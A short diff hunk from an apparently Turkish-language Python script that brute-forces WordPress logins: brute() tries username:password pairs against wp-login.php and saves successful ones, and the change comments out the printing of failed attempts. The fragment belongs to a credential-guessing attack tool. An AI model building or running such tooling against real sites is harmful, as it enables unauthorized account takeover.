@@ -62,7 +62,7 @@ def brute(url, username, password):
         save(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
         return True
     else:
-        colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarısız!', "f")
+       # colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarısız!', "f")
         return False
 
 def url2domain(url):
